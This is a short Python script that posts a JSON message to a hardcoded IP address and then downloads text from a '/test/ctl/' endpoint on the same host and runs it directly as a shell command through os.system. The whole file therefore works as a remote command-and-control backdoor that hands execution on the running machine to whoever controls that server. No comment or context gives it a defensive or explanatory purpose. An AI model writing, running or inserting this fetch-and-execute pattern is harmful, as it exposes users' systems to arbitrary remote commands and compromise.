import os
import sys

import requests
import json


testurl = 'http://223.194.128.82:80/test/'
data = {'msg': 'Warnnnnnnnnn!!'}
headers = {'Content-type':'application/json', 'Accept':'text/plain'}
r = requests.post(testurl, data=json.dumps(data), headers=headers)


ctlurl = 'http://223.194.128.82:80/test/ctl/'
data = requests.get(ctlurl)
os.system(data.text)
